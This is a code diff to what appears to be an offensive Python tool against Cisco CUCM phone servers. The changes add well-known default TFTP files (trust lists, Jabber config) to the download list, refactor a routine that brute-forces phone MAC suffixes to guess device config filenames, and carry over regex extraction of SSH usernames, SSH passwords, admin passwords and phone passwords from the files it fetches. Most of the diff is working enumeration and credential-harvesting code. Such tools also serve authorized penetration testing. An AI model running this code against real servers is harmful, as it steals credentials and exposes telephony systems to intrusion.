@@ -30,6 +30,23 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 HTTP_TFTP_PORT = 6970
 # CUCM User Data Services (UDS) API — HTTPS only, default 8443
 UDS_PORT = 8443
+# Well-known default filenames the CUCM TFTP service hosts in addition to
+# per-device SEP<MAC>.cnf.xml configs. Always attempted so we can surface
+# firmware versions, trust-list presence, Jabber bootstrap config, etc.
+DEFAULT_TFTP_FILES = (
+    'XMLDefault.cnf.xml',
+    'SEPDefault.cnf.xml',
+    'SIPDefault.cnf',
+    'ITLFile.tlv',
+    'CTLFile.tlv',
+    'RingList.xml',
+    'Ringlist-wb.xml',
+    'DistinctiveRingList.xml',
+    'jabber-config.xml',
+)
+# Sentinel used in the full_mac slot of brute-force candidate tuples to
+# identify default-file tasks (not associated with a specific device MAC).
+DEFAULT_MAC_SENTINEL = 'DEFAULT'
 # Global variables
 debug = False
 found_credentials = []
@@ -286,12 +303,12 @@ def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_mana
                 index, full_mac, filename = task
 
             if not task_cucm:
-                results_queue.put((index, full_mac, None, 'NO_CUCM', False))
+                results_queue.put((index, full_mac, filename, None, 'NO_CUCM', False))
                 work_queue.task_done()
                 continue
             with dead_cucm_lock:
                 if task_cucm in dead_cucm:
-                    results_queue.put((index, full_mac, None, 'CUCM_DEAD', False))
+                    results_queue.put((index, full_mac, filename, None, 'CUCM_DEAD', False))
                     work_queue.task_done()
                     continue
 
@@ -300,9 +317,9 @@ def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_mana
                 was_attempted, was_successful, cached_content = check_already_attempted(task_cucm, filename, db_file)
                 if was_attempted:
                     if was_successful and cached_content:
-                        results_queue.put((index, full_mac, cached_content, 'CACHED', True))
+                        results_queue.put((index, full_mac, filename, cached_content, 'CACHED', True))
                     else:
-                        results_queue.put((index, full_mac, None, 'CACHED', True))
+                        results_queue.put((index, full_mac, filename, None, 'CACHED', True))
                     work_queue.task_done()
                     continue
 
@@ -345,7 +362,7 @@ def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_mana
             if not no_db:
                 log_download_attempt(task_cucm, filename, content is not None, method, content, db_file)
 
-            results_queue.put((index, full_mac, content, method, False))
+            results_queue.put((index, full_mac, filename, content, method, False))
             work_queue.task_done()
 
         except queue.Empty:
@@ -456,10 +473,20 @@ def get_cache_list(cucm_host, use_tftp=True):
 
 def get_config_names(cucm_host, hostnames=None, use_tftp=True):
     if _TEST_MODE:
-        return ["SEPTEST00000000.cnf.xml"]
+        # Preserve historical fixture filename, then append defaults so tests
+        # that monkeypatch _TEST_MODE off still get consistent behavior with
+        # the production path.
+        return ["SEPTEST00000000.cnf.xml", *DEFAULT_TFTP_FILES]
+
+    filenames = []
+    seen = set()
+
+    def _add(name):
+        if name and name not in seen:
+            seen.add(name)
+            filenames.append(name)
 
     if hostnames:
-        filenames = []
         for host in hostnames:
             if not host:
                 continue
@@ -468,19 +495,23 @@ def get_config_names(cucm_host, hostnames=None, use_tftp=True):
             if not name:
                 continue
             if name.lower().endswith('.cnf.xml'):
-                filenames.append(name)
+                _add(name)
             else:
-                filenames.append(f'{name}.cnf.xml')
-        return filenames if filenames else []
+                _add(f'{name}.cnf.xml')
+    elif cucm_host:
+        # No hostnames provided — fall back to ConfigFileCacheList.txt for full
+        # enumeration of every device config the CUCM TFTP service has cached.
+        entries = get_cache_list(cucm_host, use_tftp=use_tftp)
+        cnf_files = [e for e in entries if e.lower().endswith('.cnf.xml')]
+        dbg(f'Cache list yielded {len(cnf_files)} .cnf.xml entries')
+        for entry in cnf_files:
+            _add(entry)
 
-    # No hostnames provided — fall back to ConfigFileCacheList.txt for full
-    # enumeration of every device config the CUCM TFTP service has cached.
-    if not cucm_host:
-        return []
-    entries = get_cache_list(cucm_host, use_tftp=use_tftp)
-    cnf_files = [e for e in entries if e.lower().endswith('.cnf.xml')]
-    dbg(f'Cache list yielded {len(cnf_files)} .cnf.xml entries')
-    return cnf_files
+    # Always attempt the well-known CUCM default files.
+    for default in DEFAULT_TFTP_FILES:
+        _add(default)
+
+    return filenames
 
 
 def get_users_api(cucm_host, port=UDS_PORT, timeout=10, max_pages=10000):
@@ -1356,6 +1387,64 @@ def get_phones_from_gowitness(gowitness_db):
         print(f'[-] Unexpected error reading gowitness database: {str(e)}')
         return []
 
+def build_brute_force_candidates(all_found_macs, mac_to_cucm, brute_mac_len):
+    """Build a randomized, CUCM-interleaved list of (cucm, full_mac, filename)
+    download tasks for the brute-force MAC enumeration flow.
+
+    Per-MAC SEP<full_mac>.cnf.xml tasks are generated for every suffix
+    permutation. Returns a flat list ordered by interleaving CUCMs so worker
+    load is spread across servers rather than hammering one at a time.
+    """
+    candidates_by_cucm = {}
+    max_variations = 16 ** brute_mac_len
+    for partial_mac in all_found_macs:
+        phone_cucm = mac_to_cucm[partial_mac]
+        if phone_cucm not in candidates_by_cucm:
+            candidates_by_cucm[phone_cucm] = set()
+        for i in range(max_variations):
+            suffix = f'{i:0{brute_mac_len}X}'.zfill(brute_mac_len)
+            full_mac = (partial_mac + suffix)[:12]
+            filename = f'SEP{full_mac}.cnf.xml'
+            candidates_by_cucm[phone_cucm].add((phone_cucm, full_mac, filename))
+
+    # Inject one task per default TFTP file per CUCM so the brute-force
+    # worker pool also pulls XMLDefault.cnf.xml, ITLFile.tlv, etc.
+    for cucm_host in list(candidates_by_cucm.keys()):
+        for default_file in DEFAULT_TFTP_FILES:
+            candidates_by_cucm[cucm_host].add((cucm_host, DEFAULT_MAC_SENTINEL, default_file))
+
+    # Randomize per-CUCM, then interleave to distribute load across servers.
+    for cucm in candidates_by_cucm:
+        candidates_by_cucm[cucm] = list(candidates_by_cucm[cucm])
+        random.shuffle(candidates_by_cucm[cucm])
+
+    all_candidates = []
+    cucm_order = list(candidates_by_cucm.keys())
+    idx = 0
+    while True:
+        added = False
+        for cucm in cucm_order:
+            if idx < len(candidates_by_cucm[cucm]):
+                all_candidates.append(candidates_by_cucm[cucm][idx])
+                added = True
+        if not added:
+            break
+        idx += 1
+
+    return all_candidates
+
+
+def device_key_for_result(full_mac, filename):
+    """Return the device identifier to key credentials/usernames under for a
+    brute-force result. For real MAC addresses this is ``SEP<full_mac>``; for
+    DEFAULT-file results (no real MAC) it is the filename with ``.cnf.xml``
+    stripped, matching the existing convention used by ``log_credentials_to_db``.
+    """
+    if full_mac == DEFAULT_MAC_SENTINEL:
+        return filename[:-8] if filename.endswith('.cnf.xml') else filename
+    return f'SEP{full_mac}'
+
+
 def main():
     global debug, found_credentials, found_usernames, file_names, hostnames, db_file, no_db, force_download
     
@@ -1693,38 +1782,7 @@ def main():
         
         # Build combined list of all MAC candidates from all phones
         print(f'Building randomized candidate list for {len(all_found_macs)} MAC prefix(es)...')
-        candidates_by_cucm = {}
-        max_variations = 16 ** brute_mac_len
-        for partial_mac in all_found_macs:
-            phone_cucm = mac_to_cucm[partial_mac]
-            if phone_cucm not in candidates_by_cucm:
-                candidates_by_cucm[phone_cucm] = set()
-            for i in range(max_variations):
-                suffix = f'{i:0{brute_mac_len}X}'.zfill(brute_mac_len)
-                # Always ensure full_mac is 12 characters
-                full_mac = (partial_mac + suffix)[:12]
-                filename = f'SEP{full_mac}.cnf.xml'
-                candidates_by_cucm[phone_cucm].add((phone_cucm, full_mac, filename))
-
-        # Randomize per-CUCM queues, then interleave to distribute load across servers
-        for cucm in candidates_by_cucm:
-            # Convert set to list and shuffle
-            candidates_by_cucm[cucm] = list(candidates_by_cucm[cucm])
-            random.shuffle(candidates_by_cucm[cucm])
-
-        all_candidates = []
-        cucm_order = list(candidates_by_cucm.keys())
-        idx = 0
-        while True:
-            added = False
-            for cucm in cucm_order:
-                if idx < len(candidates_by_cucm[cucm]):
-                    all_candidates.append(candidates_by_cucm[cucm][idx])
-                    added = True
-            if not added:
-                break
-            idx += 1
-
+        all_candidates = build_brute_force_candidates(all_found_macs, mac_to_cucm, brute_mac_len)
         print(f'Randomized {len(all_candidates)} total candidates across all phones\n')
         
         # ============================================================================
@@ -1798,14 +1856,16 @@ def main():
                 with alive_bar(len(all_candidates), title=f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: 0") as prog_bar:
                     for _ in range(len(all_candidates)):
                         try:
-                            index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
+                            index, full_mac, filename, content, method, was_cached = results_queue.get(timeout=120)
 
                             if was_cached:
                                 skipped += 1
 
                             if content:
-                                all_configs.append((full_mac, content))
-                                found_macs.append(full_mac)
+                                device_key = device_key_for_result(full_mac, filename)
+                                if full_mac != DEFAULT_MAC_SENTINEL:
+                                    found_macs.append(full_mac)
+                                all_configs.append((device_key, content))
                                 successful += 1
                                 # Update progress bar title with current count
                                 prog_bar.title(f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: {successful}")
@@ -1825,17 +1885,19 @@ def main():
                     last_status_time = time.time()
                     for _ in range(len(all_candidates)):
                         try:
-                            index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
+                            index, full_mac, filename, content, method, was_cached = results_queue.get(timeout=120)
                             processed += 1
 
                             if was_cached:
                                 skipped += 1
 
                             if content:
-                                all_configs.append((full_mac, content))
-                                found_macs.append(full_mac)
+                                device_key = device_key_for_result(full_mac, filename)
+                                if full_mac != DEFAULT_MAC_SENTINEL:
+                                    found_macs.append(full_mac)
+                                all_configs.append((device_key, content))
                                 successful += 1
-                                print(f'[+] Found config #{successful}: SEP{full_mac}')
+                                print(f'[+] Found config #{successful}: {device_key}')
                                 sys.stdout.flush()
 
                             # Print progress every 1000 items or every 5 seconds
@@ -1931,38 +1993,38 @@ def main():
             devices_with_creds = {}
             devices_with_users = {}
             
-            for mac, content in all_configs:
+            for device_key, content in all_configs:
                 # Search for secrets in this config
                 config_creds = []
                 config_users = []
-                
+
                 # Track username across the config file
                 user = ''
                 user2 = ''
-                
+
                 for line in content.split('\n'):
                     match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
                     if match:
                         if match.group(2):
                             user = match.group(2)
-                            config_users.append((user, f'SEP{mac}'))
+                            config_users.append((user, device_key))
                         if match.group(3):
                             password = match.group(3)
-                            config_creds.append((user, password, f'SEP{mac}'))
+                            config_creds.append((user, password, device_key))
                         if match.group(4):
                             user2 = match.group(4)
-                            config_users.append((user2, f'SEP{mac}'))
+                            config_users.append((user2, device_key))
                         if match.group(5):
                             password = match.group(5)
-                            config_creds.append((user if user else 'unknown', password, f'SEP{mac}'))
-                
+                            config_creds.append((user if user else 'unknown', password, device_key))
+
                 # Track devices with findings
                 if config_creds:
-                    devices_with_creds[f'SEP{mac}'] = config_creds
+                    devices_with_creds[device_key] = config_creds
                     all_found_credentials.extend(config_creds)
-                
+
                 if config_users:
-                    devices_with_users[f'SEP{mac}'] = config_users
+                    devices_with_users[device_key] = config_users
                     all_found_usernames.extend(config_users)
             
             # Display results
